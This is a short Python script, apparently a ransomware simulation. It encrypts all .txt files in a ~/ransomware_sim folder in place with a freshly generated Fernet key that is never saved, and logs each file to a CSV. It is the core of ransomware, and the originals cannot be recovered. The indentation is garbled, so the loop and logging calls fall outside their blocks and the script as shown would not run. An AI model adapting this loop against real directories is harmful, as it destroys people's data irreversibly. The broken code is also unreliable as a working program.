import os
import csv
from cryptography.fernet import Fernet
from datetime import datetime

key = Fernet.generate_key()
cipher = Fernet(key)

target_dir = os.path.expanduser("~/ransomware_sim")
log_file = os.path.join(target_dir, "ransom_log.csv")

with open(log_file, 'w', newline='') as file:
	writer = csv.writer(file)
writer.writerow(["File Name", "Timestamp", "Action" , "File Size", "Status"])

for filename in os.listdir(target_dir):
if filename.endswith(".txt") and filename != "ransom_log.csv":
filepath = os.path.join(target_dir, filename)

with open(filepath, 'rb') as f:
original_data = f.read()

encrypted_data = cipher.encrypt(original_data)

with open(filepath, 'wb') as f:

f.write(encrypted_data)
file_size = os.path.getsize(filepath)
timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
writer.writerow([filename, timestamp, "encrypted", file_size, "success"])

print("Simulation complete. Log saved in ransom_log.csv")
